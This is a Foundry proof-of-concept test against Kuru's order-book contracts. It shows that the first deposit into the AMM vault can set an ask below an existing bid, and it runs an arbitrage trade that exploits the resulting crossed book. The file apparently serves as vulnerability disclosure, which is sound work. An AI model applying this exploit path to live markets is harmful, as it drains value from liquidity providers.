//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IOrderBook} from "../contracts/interfaces/IOrderBook.sol";
import {KuruAMMVault} from "../contracts/KuruAMMVault.sol";
import {OrderBook} from "../contracts/OrderBook.sol";
import {KuruForwarder} from "../contracts/KuruForwarder.sol";
import {MarginAccount} from "../contracts/MarginAccount.sol";
import {Router} from "../contracts/Router.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MintableERC20} from "./lib/MintableERC20.sol";

contract POC_VaultInitCrossing is Test {
    // Market params
    uint96 constant SIZE_PRECISION = 10 ** 10;
    uint32 constant PRICE_PRECISION = 10 ** 4; // price = price_uint32 * 1e18 / 1e4
    uint32 constant TICK_SIZE = 10 ** 2;
    uint96 constant MIN_SIZE = 10 ** 8;
    uint96 constant MAX_SIZE = 10 ** 14;
    uint256 constant TAKER_FEE_BPS = 0;
    uint256 constant MAKER_FEE_BPS = 0;
    uint96 constant VAULT_SPREAD = 30; // 30 bps

    address BASE_TOKEN;
    address QUOTE_TOKEN;
    Router router;
    MarginAccount marginAccount;
    KuruForwarder kuruForwarder;
    OrderBook orderBook;
    KuruAMMVault vault;

    address FEE_COLLECTOR = address(0xFEE);

    function setUp() public {
        // Tokens (18 decimals)
        MintableERC20 baseToken = new MintableERC20("BASE", "BASE");
        MintableERC20 quoteToken = new MintableERC20("QUOTE", "QUOTE");
        BASE_TOKEN = address(baseToken);
        QUOTE_TOKEN = address(quoteToken);

        // Deploy implementations and proxies
        Router routerImpl = new Router();
        MarginAccount marginImpl = new MarginAccount();
        OrderBook obImpl = new OrderBook();
        KuruAMMVault vaultImpl = new KuruAMMVault();
        KuruForwarder fwdImpl = new KuruForwarder();

        router = Router(payable(new ERC1967Proxy(address(routerImpl), "")));
        kuruForwarder = KuruForwarder(address(new ERC1967Proxy(address(fwdImpl), "")));
        marginAccount = MarginAccount(payable(new ERC1967Proxy(address(marginImpl), "")));

        bytes4[] memory allowed = new bytes4[](6);
        allowed[0] = OrderBook.addBuyOrder.selector;
        allowed[1] = OrderBook.addSellOrder.selector;
        allowed[2] = OrderBook.placeAndExecuteMarketBuy.selector;
        allowed[3] = OrderBook.placeAndExecuteMarketSell.selector;
        allowed[4] = MarginAccount.deposit.selector;
        kuruForwarder.initialize(address(this), allowed);

        marginAccount.initialize(address(this), address(router), FEE_COLLECTOR, address(kuruForwarder));
        router.initialize(address(this), address(marginAccount), address(obImpl), address(vaultImpl), address(kuruForwarder));

        address orderBookAddress = router.deployProxy(
            IOrderBook.OrderBookType.NO_NATIVE,
            BASE_TOKEN,
            QUOTE_TOKEN,
            SIZE_PRECISION,
            PRICE_PRECISION,
            TICK_SIZE,
            MIN_SIZE,
            MAX_SIZE,
            TAKER_FEE_BPS,
            MAKER_FEE_BPS,
            VAULT_SPREAD
        );
        orderBook = OrderBook(orderBookAddress);

        // Compute vault address and bind instance
        address vaultAddress = router.computeVaultAddress(orderBookAddress, address(0), false);
        vault = KuruAMMVault(payable(vaultAddress));
    }

    function test_VaultInitialization_CrossesBook_AllowsArbitrage() public {
        console.log("=== Missing crossing-the-book validation on first deposit ===");

        // Maker posts a high bid (best bid) on the book
        address maker = makeAddr("maker");
        uint256 makerQuote = 1_000_000 ether; // plenty
        MintableERC20(QUOTE_TOKEN).mint(maker, makerQuote);

        vm.startPrank(maker);
        MintableERC20(QUOTE_TOKEN).approve(address(marginAccount), makerQuote);
        marginAccount.deposit(maker, QUOTE_TOKEN, makerQuote);

        // Place a buy order at 1.10 (11000 in PRICE_PRECISION)
        uint32 bidPrice = 11000; // => 1.10e18 in vault price precision
        // Choose a size strictly between MIN_SIZE and MAX_SIZE to avoid SizeError
        uint96 bidSize = 9_000 * SIZE_PRECISION; // < MAX_SIZE (1e14)
        orderBook.addBuyOrder(bidPrice, bidSize, false);
        vm.stopPrank();

        // First vault deposit sets ask at 1.00 (10000 scaled)
        address lp = makeAddr("lp");
        uint256 baseDeposit = 1_000 ether;
        uint256 quoteDeposit = 1_000 ether; // ratio => price = 1.0e18
        MintableERC20(BASE_TOKEN).mint(lp, baseDeposit);
        MintableERC20(QUOTE_TOKEN).mint(lp, quoteDeposit);

        vm.startPrank(lp);
        // Approve vault to pull tokens
        MintableERC20(BASE_TOKEN).approve(address(vault), baseDeposit);
        MintableERC20(QUOTE_TOKEN).approve(address(vault), quoteDeposit);
        // Perform first deposit which sets initial vault prices and sizes
        uint256 shares = vault.deposit(baseDeposit, quoteDeposit, lp);
        vm.stopPrank();

        // Inspect overall best bid/ask (book vs vault combined)
        (uint256 bestBidOverall, uint256 bestAskOverall) = orderBook.bestBidAsk();
        console.log("Best bid overall:", bestBidOverall);
        console.log("Best ask overall:", bestAskOverall);
        console.log("LP shares minted:", shares);

        // Assert that the overall best bid (from book at 1.10e18) > overall best ask (from vault at ~1.00e18)
        assertGt(bestBidOverall, bestAskOverall, "Expected crossed book state: best bid should exceed best ask");

        // Optional: demonstrate immediate arbitrage opportunity
        address arb = makeAddr("arb");
        MintableERC20(QUOTE_TOKEN).mint(arb, 100_000 ether);
        MintableERC20(BASE_TOKEN).mint(arb, 100_000 ether);

        vm.startPrank(arb);
        // Use margin for convenience
        MintableERC20(QUOTE_TOKEN).approve(address(marginAccount), 100_000 ether);
        MintableERC20(BASE_TOKEN).approve(address(marginAccount), 100_000 ether);
        marginAccount.deposit(arb, QUOTE_TOKEN, 100_000 ether);
        marginAccount.deposit(arb, BASE_TOKEN, 100_000 ether);

        // Buy from the vault at 1.00e18 using quote (fills via vault as it's the best ask)
        uint96 quoteToSpendPricePrecision = 10_000; // small size (scaled by PRICE_PRECISION internally in router, here we call OB directly)
        // Here we call market directly: expect to buy small base amount according to best ask (1.00e18)
        uint256 baseReceived = orderBook.placeAndExecuteMarketBuy(quoteToSpendPricePrecision, 0, true, false);
        console.log("Arb base bought from vault:", baseReceived);

        // Sell the received base into the high bid at 1.10e18
        uint96 sizeToSell = 1 * SIZE_PRECISION; // small lot; avoid complexity
        uint256 quoteReceived = orderBook.placeAndExecuteMarketSell(sizeToSell, 0, true, false);
        console.log("Arb quote received by selling into bid:", quoteReceived);
        vm.stopPrank();

        // The mere presence of crossed state after first deposit proves the missing validation
        // The actual profit accounting depends on sizes; we only need to show crossed book is allowed.
    }
}